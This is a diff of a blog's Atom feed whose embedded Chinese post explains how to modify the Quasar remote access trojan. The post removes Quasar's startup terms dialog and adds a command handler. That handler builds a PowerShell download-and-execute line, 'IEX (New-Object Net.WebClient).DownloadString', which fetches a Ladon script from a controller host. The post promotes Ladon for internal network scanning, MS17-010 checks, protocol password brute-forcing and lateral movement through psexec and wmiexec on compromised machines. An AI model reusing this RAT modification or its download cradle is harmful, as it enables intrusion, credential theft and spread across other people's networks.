@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-01-09T16:09:27.407Z</updated>
+  <updated>2021-01-09T16:18:05.784Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://k8gege.org/p/quasar.html"/>
     <id>http://k8gege.org/p/quasar.html</id>
     <published>2021-01-08T16:10:00.000Z</published>
-    <updated>2021-01-09T16:09:27.407Z</updated>
+    <updated>2021-01-09T16:18:05.784Z</updated>
     
     <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>修改Quasar加载Ladon一键扫描内网,在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等</p><h3 id="QuasarRat"><a href="#QuasarRat" class="headerlink" title="QuasarRat"></a>QuasarRat</h3><p>Quasar是一种公开可用的开源远程访问木马（RAT），主要针对Windows操作系统。Quasar通过恶意附件在网络钓鱼电子邮件中分发。<br>Quasar最初是由GitHub用户 MaxXor 开发，用于合法用途。然而，该工具此后被黑客用于各种网络间谍活动。Quasar于2014年7月首次发布，名为“xRAT 2.0”，后来于2015年8月更名为“Quasar”。<a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></p><h3 id="去启动框"><a href="#去启动框" class="headerlink" title="去启动框"></a>去启动框</h3><p>主窗体，注释以下代码,启动客户端就不会再弹启动框了</p><pre><code>private void ShowTermsOfService(){    //using (var frm = new FrmTermsOfUse())    //{    //    frm.ShowDialog();    //}    //Thread.Sleep(300);}</code></pre><h3 id="联动Ladon"><a href="#联动Ladon" class="headerlink" title="联动Ladon"></a>联动Ladon</h3><p>SystemHandler.cs第484行，加上以下代码，Url改成自己的PowerLadon,编译即可。当然这段代码放在客户端的下发指令这里也可以。</p><pre><code>else if (input.Substring(0, 5) == &quot;Ladon&quot;){    string LadonUrl = &quot;http://192.168.1.110:800/Ladon.ps1&quot;;    string LadonCmd = &quot;powershell -nop -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&quot; + LadonUrl + &quot;&apos;); &quot; + input + &quot;\&quot;&quot;;    _shell.ExecuteCommand(LadonCmd);}</code></pre><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p><p>PS：任何shell、C2、RAT、后门不管你怎么称呼，但凡能执行命令的地方，都可用此方法加载Ladon强化自己的工具</p><h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
     
